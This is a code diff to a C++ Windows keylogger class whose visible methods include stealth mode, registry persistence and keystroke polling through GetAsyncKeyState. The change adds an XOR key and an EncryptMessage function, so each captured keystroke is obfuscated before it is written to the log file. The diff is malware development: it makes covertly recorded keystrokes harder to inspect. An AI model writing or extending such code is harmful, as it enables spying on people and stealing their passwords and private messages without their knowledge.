@@ -14,6 +14,7 @@
 KeyLogger::KeyLogger(std::string Path)
 {
 	OutPath = Path;
+	EncryptKey = 9901;
 }
 
 bool KeyLogger::StartStealthMode()
@@ -47,6 +48,8 @@ void KeyLogger::StartLogging()
 					CapsIsPressed = !CapsIsPressed;
 
 				Character = GetChar(Key, CapsIsPressed);
+
+				EncryptMessage(Character);
 
 				WriteMessage(Character);
 			}
@@ -369,4 +372,10 @@ bool KeyLogger::RegisterPersistence()
 bool KeyLogger::IsPressed(int Key)
 {
 	return (GetAsyncKeyState(Key) & MSB);
+}
+
+void KeyLogger::EncryptMessage(std::string& Message)
+{
+	for (size_t i = 0; i < Message.length(); i++)
+		Message[i] ^= EncryptKey;
 }
